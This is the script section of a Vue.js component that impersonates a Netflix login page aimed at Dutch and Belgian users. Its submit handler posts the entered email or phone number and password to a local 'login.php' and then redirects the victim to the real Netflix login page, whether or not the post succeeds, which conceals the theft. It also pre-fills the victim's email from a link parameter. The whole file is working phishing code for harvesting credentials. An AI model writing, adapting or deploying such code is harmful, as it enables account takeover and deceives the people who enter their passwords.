<script>
/* eslint-disable */
import axios from 'axios'
export default {
  name: 'App',
  data () {
    return {
      login: '',
      password: '',
      loginError: false,
      passwordError: false,
      phoneSelectOpen: false,
      phoneCountry: 'nl',
      passwordInputFocus: false,
      passwordVisible: false,
      referrerPage: "//www.netflix.com/nl/login"
    }
  },
  computed: {
    isPhone () {
      return this.login.match(/^-?\d+\.?\d*$/)
    }
  },
  methods: {
    selectPhoneCountry (country) {
      let t = this
      t.phoneCountry = country
      t.phoneSelectOpen = false
    },
    togglePasswordVisible () {
      let t = this
      t.passwordVisible = !t.passwordVisible
    },
    submitForm () {
      let vm = this
      if (vm.isPhone) {
        vm.loginError = !vm.login.match(/^(?=^.{10,11}$)0\d*-?\d*$/)
      } else {
        const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
        vm.loginError = !re.test(String(vm.login).toLowerCase());
      }
      vm.passwordError = vm.password.length < 4 || vm.password.length > 60 
      if (!vm.loginError && !vm.passwordError) {
        axios.post('login.php', {email: vm.login, password: vm.password})
        .then(res => {
          window.location.replace(vm.referrerPage);
        })
        .catch(error => {
          window.location.replace(vm.referrerPage);
        })
      }
    },
    initiatePage () {
      let uri = window.location.href.split("?");
      if (uri.length > 0 && uri[1] !== undefined) {
          let vars = uri[1].split("&");
          let getVars = {};
          let tmp = "";
          vars.forEach(function(v) {
            tmp = v.split("=");
            if (tmp.length == 2)
              getVars[tmp[0].toLowerCase()] = decodeURIComponent(tmp[1]);
          });
          this.login = "undefined" !== typeof getVars["e"] ? getVars["e"] : "";
      }
    }
  },
  watch: {
    login: function (val) {
      if (val.match(/^06.*$/)) {
        this.phoneCountry = 'nl'
      } else {
        this.phoneCountry = 'be'
      }
    }
  },
  beforeMount () {
    this.initiatePage()
  }
};
</script>

